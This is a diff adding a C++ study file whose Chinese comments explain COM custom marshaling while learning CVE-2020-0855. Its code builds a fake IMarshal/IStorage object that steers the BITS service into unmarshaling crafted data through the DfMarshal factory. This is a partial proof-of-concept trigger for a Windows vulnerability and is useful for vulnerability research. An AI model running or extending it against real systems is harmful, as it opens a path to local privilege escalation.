@@ -1,0 +1,401 @@
+//为了学习CVE-2020-0855而学习的Marshal
+
+//Marshal分为标准Marshal以及自定义Marshal，它的作用是为了将接口指针从一个套间传入另一个套间，它可以在不同的计算机以及不同进程或者相同进程中工作，其中标准Marshal采用rpc通信方式
+
+//如果不满足标准Marshal的通信方式，则可以使用自定义Marshal，比如需要命名管道，共享内存，油槽，或者其他的网络协议等
+
+//对于服务端来说，自己构造自定义Marshal比使用标准Marshal更加困难，因为自定义Marshal需要在定制数据里面实现如何创建存根和代理以及它们通信方式等等信息，
+////就是想干啥就干啥，弄自己的加密方式都可以
+
+//如果不理解自定义封送处理过程，那么就无法就理解漏洞是怎么触发的
+//https://www.thrysoee.dk/InsideCOM+/ch14c.htm
+
+//用容易理解的话来说，就是客户端调用CoMarshalInterface初始化代理所需要的数据（Marshal）传递给服务端，服务端接受数据后调用UnmarshalInterface来初始化代理，问题就在服务端调用UnmarshalInterface时产生的一系列漏洞
+
+//由于poc是作为客户端来攻击，所以我们只需要实现Marshal类CoMarshalInterface中所调用Marshal的方法，最方便又不出错的方法是在自己定制的Marshal类的方法中去使用标准Marshal方法，这样就实现了伪自定义Marshal
+
+//说的太多也许还不如实际代码过一遍，下面是最简单的触发一次和服务通信，使服务用DfMarshal代理处理Marshal，也就是CDocfileUnmarshalFactory::UnmarshalInterface
+
+//附加到BITS服务，对coml2!DfUnMarshalInterface下断点，运行后则会命中断点，最后由于定制数据里只包含了IID_IStorage导致进入CExposedDocFile::Unmarshal失败返回
+
+#include <stdio.h>
+#include <windows.h>
+#include <hstring.h>
+#include <cstdio>
+#include <cstdlib>
+#include <iostream>
+#include <shobjidl_core.h>
+#include <string.h>
+#include <windows.h>
+#include <strsafe.h>
+#include <tlhelp32.h>
+#include <inspectable.h>
+#include<shlobj_core.h>
+#include<objidl.h>
+#include <atlbase.h>
+#include <vector>
+#include <docobj.h>
+#include <MsHtmcid.h>
+#include <comutil.h>
+#include <bits.h>
+#define MAX_LENGTH 50
+#define NORMAL_LENGTH 20
+#pragma warning(disable:4996)
+
+using namespace std;
+
+IUnknown* unk2;
+class CMarshaller : public IMarshal, IStorage
+{
+	LONG _ref_count;
+	IStorage* _stg;
+
+	~CMarshaller() {}
+
+public:
+
+	CMarshaller(IStorage* stg)
+	{
+		_stg = stg;
+		printf("this %x\n", this);
+		unk2 = static_cast<IUnknown*>(static_cast<IStorage*>(this));
+
+	}
+
+
+	virtual HRESULT STDMETHODCALLTYPE CreateStream(
+		/* [string][in] */ __RPC__in_string const OLECHAR* pwcsName,
+		/* [in] */ DWORD grfMode,
+		/* [in] */ DWORD reserved1,
+		/* [in] */ DWORD reserved2,
+		/* [out] */ __RPC__deref_out_opt IStream** ppstm) override
+	{
+		printf("call CreateStream: \n");
+		return S_OK;
+	}
+
+	virtual /* [local] */ HRESULT STDMETHODCALLTYPE OpenStream(
+		/* [annotation][string][in] */
+		_In_z_  const OLECHAR* pwcsName,
+		/* [annotation][unique][in] */
+		_Reserved_  void* reserved1,
+		/* [in] */ DWORD grfMode,
+		/* [in] */ DWORD reserved2,
+		/* [annotation][out] */
+		_Outptr_  IStream** ppstm) override
+	{
+		printf("call OpenStream: \n");
+		return S_OK;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE CreateStorage(
+		/* [string][in] */ __RPC__in_string const OLECHAR* pwcsName,
+		/* [in] */ DWORD grfMode,
+		/* [in] */ DWORD reserved1,
+		/* [in] */ DWORD reserved2,
+		/* [out] */ __RPC__deref_out_opt IStorage** ppstg) override
+	{
+		printf("call CreateStorage: \n");
+		return S_OK;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE OpenStorage(
+		/* [string][unique][in] */ __RPC__in_opt_string const OLECHAR* pwcsName,
+		/* [unique][in] */ __RPC__in_opt IStorage* pstgPriority,
+		/* [in] */ DWORD grfMode,
+		/* [unique][in] */ __RPC__deref_opt_in_opt SNB snbExclude,
+		/* [in] */ DWORD reserved,
+		/* [out] */ __RPC__deref_out_opt IStorage** ppstg) override
+	{
+		printf("call OpenStorage: \n");
+		return S_OK;
+	}
+
+	virtual /* [local] */ HRESULT STDMETHODCALLTYPE CopyTo(
+		/* [in] */ DWORD ciidExclude,
+		/* [annotation][size_is][unique][in] */
+		_In_reads_opt_(ciidExclude)  const IID* rgiidExclude,
+		/* [annotation][unique][in] */
+		_In_opt_  SNB snbExclude,
+		/* [annotation][unique][in] */
+		_In_  IStorage* pstgDest) override
+	{
+		printf("call CopyTo: \n");
+		return S_OK;
+	}
+	virtual HRESULT STDMETHODCALLTYPE MoveElementTo(
+		/* [string][in] */ __RPC__in_string const OLECHAR* pwcsName,
+		/* [unique][in] */ __RPC__in_opt IStorage* pstgDest,
+		/* [string][in] */ __RPC__in_string const OLECHAR* pwcsNewName,
+		/* [in] */ DWORD grfFlags) override
+	{
+		printf("call MoveElementTo: \n");
+		return S_OK;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE Commit(
+		/* [in] */ DWORD grfCommitFlags) override
+	{
+		printf("call Commit: \n");
+		return S_OK;
+	}
+	virtual HRESULT STDMETHODCALLTYPE Revert(void) override
+	{
+		printf("call Revert: \n");
+		return S_OK;
+	}
+
+	virtual /* [local] */ HRESULT STDMETHODCALLTYPE EnumElements(
+		/* [annotation][in] */
+		_Reserved_  DWORD reserved1,
+		/* [annotation][size_is][unique][in] */
+		_Reserved_  void* reserved2,
+		/* [annotation][in] */
+		_Reserved_  DWORD reserved3,
+		/* [annotation][out] */
+		_Outptr_  IEnumSTATSTG** ppenum) override
+	{
+		printf("call EnumElements: \n");
+		return S_OK;
+	}
+	virtual HRESULT STDMETHODCALLTYPE DestroyElement(
+		/* [string][in] */ __RPC__in_string const OLECHAR* pwcsName) override
+	{
+		printf("call DestroyElement: \n");
+		return S_OK;
+	}
+	virtual HRESULT STDMETHODCALLTYPE RenameElement(
+		/* [string][in] */ __RPC__in_string const OLECHAR* pwcsOldName,
+		/* [string][in] */ __RPC__in_string const OLECHAR* pwcsNewName)override
+	{
+		printf("call RenameElement: \n");
+		return S_OK;
+	}
+	virtual HRESULT STDMETHODCALLTYPE SetElementTimes(
+		/* [string][unique][in] */ __RPC__in_opt_string const OLECHAR* pwcsName,
+		/* [unique][in] */ __RPC__in_opt const FILETIME* pctime,
+		/* [unique][in] */ __RPC__in_opt const FILETIME* patime,
+		/* [unique][in] */ __RPC__in_opt const FILETIME* pmtime) override
+	{
+		printf("call SetElementTimes: \n");
+		return S_OK;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE SetClass(
+		/* [in] */ __RPC__in REFCLSID clsid)override
+	{
+		printf("call SetClass: \n");
+		return S_OK;
+	}
+	virtual HRESULT STDMETHODCALLTYPE SetStateBits(
+		/* [in] */ DWORD grfStateBits,
+		/* [in] */ DWORD grfMask) override
+	{
+		printf("call SetStateBits: \n");
+		return S_OK;
+	}
+	virtual HRESULT STDMETHODCALLTYPE Stat(
+		/* [out] */ __RPC__out STATSTG* pstatstg,
+		/* [in] */ DWORD grfStatFlag)override
+	{
+		printf("call Stat: \n");
+		_stg->Stat(pstatstg, grfStatFlag);
+
+		return S_OK;
+	}
+
+
+
+
+	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
+		/* [in] */ REFIID riid,
+		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR* __RPC_FAR* ppvObject)override
+	{
+
+		*ppvObject = nullptr;
+		if (riid == IID_IUnknown)
+		{
+			*ppvObject = this;
+		}
+		else if (riid == IID_IMarshal)
+		{
+			*ppvObject = static_cast<IMarshal*>(this);
+		}
+		else
+		{
+			return E_NOINTERFACE;
+		}
+		((IUnknown*)*ppvObject)->AddRef();
+		return S_OK;
+	}
+
+	virtual ULONG STDMETHODCALLTYPE AddRef(void)
+	{
+
+		return InterlockedIncrement(&_ref_count);
+	}
+
+	virtual ULONG STDMETHODCALLTYPE Release(void)
+	{
+
+		ULONG ret = InterlockedDecrement(&_ref_count);
+		if (ret == 0)
+		{
+			printf("Release object %p\n", this);
+			delete this;
+		}
+		return ret;
+	}
+
+
+
+	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
+		/* [annotation][in] */
+		_In_  REFIID riid,
+		/* [annotation][unique][in] */
+		_In_opt_  void* pv,
+		/* [annotation][in] */
+		_In_  DWORD dwDestContext,
+		/* [annotation][unique][in] */
+		_Reserved_  void* pvDestContext,
+		/* [annotation][in] */
+		_In_  DWORD mshlflags,
+		/* [annotation][out] */
+		_Out_  CLSID* pCid)
+	{
+
+		UUID  clsid;
+		printf("Call:  GetUnmarshalClass\n");
+
+
+		//获取代理的CLSID，这里使用漏洞代理DfMarshal的CLSID 在ida中DfMarshal名字为CDocfileUnmarshalFactory
+		CLSIDFromString(L"{0000030B-0000-0000-C000-000000000046}", &clsid);
+		*pCid = clsid;
+		return S_OK;
+	}
+	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
+		/* [annotation][unique][in] */
+		_In_  IStream* pStm,
+		/* [annotation][in] */
+		_In_  REFIID riid,
+		/* [annotation][unique][in] */
+		_In_opt_  void* pv,
+		/* [annotation][in] */
+		_In_  DWORD dwDestContext,
+		/* [annotation][unique][in] */
+		_Reserved_  void* pvDestContext,
+		/* [annotation][in] */
+		_In_  DWORD mshlflags)
+	{
+
+		CLSID clisd;
+
+		//iid 写死  IStorage的iid
+		CLSIDFromString(L"{0000000b-0000-0000-C000-000000000046}", &clisd);
+
+		IMarshal* pMarshal;
+		HRESULT hr = CoGetStandardMarshal(clisd, (LPUNKNOWN)pv, dwDestContext, pvDestContext, mshlflags, &pMarshal);
+		hr = pMarshal->MarshalInterface(pStm, clisd, pv, dwDestContext, pvDestContext, mshlflags);
+		//这个引用计数增加的是MyObject的引用计数。
+
+		char buf[1024];
+		//头16个字节为iid
+		pStm->Write(&clisd, 16, 0);
+		//剩余数据用写0
+		pStm->Write(buf, 1024-16, 0);
+
+		return 0;
+
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
+		/* [annotation][in] */
+		_In_  REFIID riid,
+		/* [annotation][unique][in] */
+		_In_opt_  void* pv,
+		/* [annotation][in] */
+		_In_  DWORD dwDestContext,
+		/* [annotation][unique][in] */
+		_Reserved_  void* pvDestContext,
+		/* [annotation][in] */
+		_In_  DWORD mshlflags,
+		/* [annotation][out] */
+		_Out_  DWORD* pSize)
+	{
+		printf("call GetMarshalSizeMax: \n");
+		*pSize = 1024;
+		return S_OK;
+	}
+
+
+
+
+	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
+		/* [annotation][unique][in] */
+		_In_  IStream* pStm,
+		/* [annotation][in] */
+		_In_  REFIID riid,
+		/* [annotation][out] */
+		_Outptr_  void** ppv)
+	{
+		printf("call UnmarshalInterface: \n");
+		return E_NOTIMPL;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
+		/* [annotation][unique][in] */
+		_In_  IStream* pStm)
+	{
+		printf("call ReleaseMarshalData: \n");
+		return S_OK;
+	}
+
+	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
+		/* [annotation][in] */
+		_In_  DWORD dwReserved)
+	{
+		printf("call DisconnectObject: \n");
+		return S_OK;
+	}
+};
+
+
+int main(int argc, char* argv[]) {
+
+	IStorage* stg = nullptr;
+
+	CoInitialize(NULL);
+
+	StgCreateDocfile(
+		L"123.ABC",
+		STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE,
+		NULL,
+		&stg);
+
+	CMarshaller* p = new CMarshaller(stg);
+
+	IBackgroundCopyManager* pQueueMgr;
+	IID CLSID_BackgroundCopyManager;
+	IID IID_IBackgroundCopyManager;
+	IBackgroundCopyJob* pJob;
+	GUID guidJob;
+
+	CLSIDFromString(L"{4991d34b-80a1-4291-83b6-3328366b9097}", &CLSID_BackgroundCopyManager);
+	CLSIDFromString(L"{5ce34c0d-0dc9-4c1f-897c-daa1b78cee7c}", &IID_IBackgroundCopyManager);
+
+	CoCreateInstance(CLSID_BackgroundCopyManager, NULL,
+		CLSCTX_LOCAL_SERVER, IID_IBackgroundCopyManager, (void**)&pQueueMgr);
+
+	pQueueMgr->CreateJob(L"BitsAuthSample",
+		BG_JOB_TYPE_DOWNLOAD,
+		&guidJob,
+		&pJob);
+
+	//触发bit服务调用DfUnMarshalInterface
+	pJob->SetNotifyInterface(unk2);
+
+	getchar();
+
+
+	return 0;
+}
